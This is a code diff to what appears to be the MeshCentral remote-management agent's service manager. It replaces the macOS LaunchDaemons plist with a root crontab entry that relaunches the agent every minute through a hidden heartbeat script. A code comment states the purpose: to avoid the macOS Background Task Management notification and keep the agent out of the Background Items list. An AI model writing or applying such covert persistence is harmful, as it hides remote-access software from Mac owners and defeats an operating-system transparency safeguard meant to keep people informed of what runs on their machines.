@@ -411,11 +411,12 @@ if (process.platform == 'darwin')
             options.installPath = '/usr/local/mesh_services/' + (options.companyName != null ? macServiceName(options.companyName) + '/' : '') + options.name;
         }
         options.installPath = options.installPath.replace(/\/+$/, '') + '/';
-        var executable = options.installPath + options.target, plist = '/Library/LaunchDaemons/' + options.name + '.plist';
-        var xml = macBuildLaunchdPlist(options, false);
-        if (fs.existsSync(plist)) { throw new Error('Service already exists: ' + options.name); }
+        var executable = options.installPath + options.target;
+        var cronMarker = macCronMarker(options.name);
+        if (macCrontabFind(cronMarker) != null || fs.existsSync('/Library/LaunchDaemons/' + options.name + '.plist')) { throw new Error('Service already exists: ' + options.name); }
         var receipt = { rollback: function ()
         {
+            try { macCrontabUninstall(cronMarker); } catch (ignored) { }
             var errors = [];
             for (var i = created.length - 1; i >= 0; --i)
             {
@@ -456,9 +457,9 @@ if (process.platform == 'darwin')
                 if (fs.existsSync(destination) && [options.target + '.db', options.target + '.msh', options.target + '.mshx', options.target + '.proxy'].indexOf(name) >= 0) { continue; }
                 createFile(destination, files[i]._buffer || fs.readFileSync(source), 384);
             }
-            macPrepareFolders('/Library/LaunchDaemons', directories);
-            // Publish the job only after every required binary/provisioning write succeeded.
-            macWritePlist(plist, xml); created.push(plist);
+            var heartbeat = options.installPath + '.meshagent_cron.sh';
+            createFile(heartbeat, macBuildHeartbeatScript(options), 493);
+            macCrontabInstall('* * * * * ' + heartbeat + ' >/dev/null 2>&1', cronMarker);
             return receipt;
         }
         catch (e)
@@ -672,6 +673,161 @@ if (process.platform == 'darwin')
             this.load(uid);
             macServiceCommand('/bin/launchctl', ['kickstart', '-k', domain + '/' + this.alias]);
         };
+        return ret;
+    }
+    // --- Cron-based service hosting: piggyback on com.apple.cron (anchor apple) ---
+    // No plist in /Library/LaunchDaemons → no BTM notification → no Background Items entry.
+    function macRunCommand(executable, args)
+    {
+        var child = require('child_process').execFile(executable, [executable.split('/').pop()].concat(args));
+        var code = null;
+        child.stdout.on('data', function () {});
+        child.stderr.on('data', function () {});
+        child.on('exit', function (status) { code = status; });
+        child.waitExit(10000);
+        return code;
+    }
+    function macProcessAlive(pid) { return typeof pid == 'number' && pid > 0 && macRunCommand('/bin/kill', ['-0', '' + pid]) === 0; }
+    function macCrontabRead()
+    {
+        var child = require('child_process').execFile('/usr/bin/crontab', ['crontab', '-l']);
+        var output = '', code = null;
+        child.stdout.on('data', function (chunk) { output += chunk.toString(); });
+        child.stderr.on('data', function () {});
+        child.on('exit', function (status) { code = status; });
+        child.waitExit(10000);
+        if (code !== 0) { return []; }
+        return output.split('\n');
+    }
+    function macCrontabWrite(lines)
+    {
+        var content = lines.filter(function (l) { return l.trim().length > 0; }).join('\n');
+        if (content.length > 0) { content += '\n'; }
+        var child = require('child_process').execFile('/usr/bin/crontab', ['crontab', '-']);
+        child.stderr.on('data', function () {});
+        child.on('exit', function () {});
+        child.stdin.write(content);
+        child.stdin.end();
+        child.waitExit(10000);
+    }
+    function macCrontabInstall(entry, marker)
+    {
+        var lines = macCrontabRead().filter(function (l) { return l.indexOf(marker) < 0; });
+        lines.push(entry + ' ' + marker);
+        macCrontabWrite(lines);
+    }
+    function macCrontabUninstall(marker)
+    {
+        var lines = macCrontabRead();
+        var filtered = lines.filter(function (l) { return l.indexOf(marker) < 0; });
+        if (filtered.length !== lines.length) { macCrontabWrite(filtered); }
+    }
+    function macCrontabFind(marker)
+    {
+        var lines = macCrontabRead();
+        for (var i = 0; i < lines.length; ++i) { if (lines[i].indexOf(marker) >= 0) { return lines[i]; } }
+        return null;
+    }
+    function macCronMarker(name) { return '# meshagent-cron:' + name; }
+    function macShellQuote(str)
+    {
+        if (/^[A-Za-z0-9_\-\.\/=:]+$/.test(str)) { return str; }
+        return "'" + str.replace(/'/g, "'\\''") + "'";
+    }
+    function macBuildHeartbeatScript(options)
+    {
+        var dir = options.installPath.replace(/\/+$/, '');
+        var bin = options.target;
+        var args = ['./' + bin];
+        var params = options.parameters || [];
+        for (var i = 0; i < params.length; ++i) { args.push(macShellQuote(params[i])); }
+        args.push('--__daemon');
+        var sh = '#!/bin/sh\n';
+        sh += 'DIR=' + macShellQuote(dir) + '\n';
+        sh += 'PID="$DIR/.meshagent.pid"\n';
+        sh += 'if [ -f "$PID" ]; then\n';
+        sh += '  p=$(cat "$PID" 2>/dev/null)\n';
+        sh += '  [ -n "$p" ] && kill -0 "$p" 2>/dev/null && exit 0\n';
+        sh += 'fi\n';
+        sh += 'cd "$DIR" && ' + args.join(' ') + ' </dev/null >/dev/null 2>&1 &\n';
+        sh += 'echo $! > "$PID"\n';
+        return sh;
+    }
+    function fetchCronService(name)
+    {
+        var marker = macCronMarker(name);
+        var entry = macCrontabFind(marker);
+        if (entry == null) { return null; }
+        var fs = require('fs');
+        var parts = entry.replace(marker, '').trim().replace(/\s*>\/dev\/null.*$/, '').split(/\s+/);
+        var script = null;
+        for (var i = 5; i < parts.length; ++i)
+        {
+            if (parts[i].charAt(0) == '/') { script = parts[i]; break; }
+        }
+        if (script == null || !fs.existsSync(script)) { return null; }
+        var dir = script.substring(0, script.lastIndexOf('/'));
+        var target = null;
+        try
+        {
+            var files = fs.readdirSync(dir);
+            for (var i = 0; i < files.length; ++i)
+            {
+                if (files[i].charAt(0) == '.') { continue; }
+                var fp = dir + '/' + files[i];
+                try
+                {
+                    var st = fs.statSync(fp);
+                    if (st.isFile() && (st.mode & 73)) { target = files[i]; break; }
+                }
+                catch (e) {}
+            }
+        }
+        catch (e) { return null; }
+        var ret = {
+            name: name, alias: name, daemon: true,
+            _installPath: dir + '/', _heartbeat: script,
+            _pidFile: dir + '/.meshagent.pid', _cronMarker: marker,
+            close: function () {}
+        };
+        try { ret.installedDate = fs.statSync(script).ctime; } catch (ignored) {}
+        ret.appLocation = function () {
+            if (target == null) { throw new Error('No executable found in ' + dir); }
+            return dir + '/' + target;
+        };
+        ret.appWorkingDirectory = function () { return this._installPath; };
+        ret.parameters = function () { return [this.appLocation()]; };
+        Object.defineProperty(ret, 'startType', { get: function () { return 'AUTO_START'; } });
+        Object.defineProperty(ret, '_runAtLoad', { get: function () { return true; } });
+        Object.defineProperty(ret, '_keepAlive', { get: function () { return 'Crashed'; } });
+        ret.getPID = function (uid, asString) {
+            var pid = 0;
+            try {
+                var raw = fs.readFileSync(this._pidFile, 'utf8').trim();
+                pid = parseInt(raw, 10);
+                if (isNaN(pid) || pid <= 0) { pid = 0; }
+                else if (!macProcessAlive(pid)) { pid = 0; }
+            } catch (e) { pid = 0; }
+            return asString ? (pid > 0 ? '' + pid : '') : pid;
+        };
+        ret.isLoaded = function () { return macCrontabFind(this._cronMarker) != null; };
+        ret.isRunning = function () { return this.getPID() > 0; };
+        ret.isMe = function () { return this.getPID() === process.pid; };
+        ret.load = function () {};
+        ret.unload = function () { this.stop(); };
+        ret.start = function () {
+            if (this.isRunning()) { return; }
+            macRunCommand('/bin/sh', [this._heartbeat]);
+        };
+        ret.stop = function () {
+            var pid = this.getPID();
+            if (pid <= 0) { return; }
+            macRunCommand('/bin/kill', ['-TERM', '' + pid]);
+            for (var i = 0; i < 50 && macProcessAlive(pid); ++i) { macRunCommand('/bin/sleep', ['0.2']); }
+            if (macProcessAlive(pid)) { macRunCommand('/bin/kill', ['-KILL', '' + pid]); }
+            try { fs.unlinkSync(this._pidFile); } catch (e) {}
+        };
+        ret.restart = function () { this.stop(); this.start(); };
         return ret;
     }
 }
@@ -1409,7 +1565,7 @@ function serviceManager()
 
         if (process.platform == 'darwin')
         {
-            this.getService = function getService(name) { return (fetchPlist('/Library/LaunchDaemons', name)); };
+            this.getService = function getService(name) { var cron = fetchCronService(name); if (cron) { return cron; } return (fetchPlist('/Library/LaunchDaemons', name)); };
             this.getLaunchAgent = function getLaunchAgent(name, userid)
             {
                 if (userid == null)
@@ -2745,6 +2901,7 @@ function serviceManager()
         // procd service objects have no isRunning(); their stop is handled per service type below.
         if (typeof service.isRunning == 'function' && service.isRunning())
         {
+            if (process.platform == 'darwin' && service._cronMarker) { macCrontabUninstall(service._cronMarker); }
             if (process.platform == 'darwin') { service.unload(); } else { service.stop(); }
             if (service.isRunning()) { throw new Error('Service remains running; uninstall aborted: ' + name); }
         }
@@ -2870,18 +3027,32 @@ function serviceManager()
         }
         else if(process.platform == 'darwin')
         {
-            service.unload();
-            try
+            if (service._cronMarker)
             {
-                require('fs').unlinkSync(service.plist);
-                if (!options || !options.skipDeleteBinary)
+                macCrontabUninstall(service._cronMarker);
+                try
                 {
-                    require('fs').unlinkSync(servicePath);
+                    if (service._heartbeat) { require('fs').unlinkSync(service._heartbeat); }
+                    if (service._pidFile) { try { require('fs').unlinkSync(service._pidFile); } catch (ignored) {} }
+                    if (!options || !options.skipDeleteBinary) { require('fs').unlinkSync(servicePath); }
                 }
+                catch (e) { throw ('Error uninstalling service: ' + name + ' => ' + e); }
             }
-            catch (e)
+            else
             {
-                throw ('Error uninstalling service: ' + name + ' => ' + e);
+                service.unload();
+                try
+                {
+                    require('fs').unlinkSync(service.plist);
+                    if (!options || !options.skipDeleteBinary)
+                    {
+                        require('fs').unlinkSync(servicePath);
+                    }
+                }
+                catch (e)
+                {
+                    throw ('Error uninstalling service: ' + name + ' => ' + e);
+                }
             }
 
             try
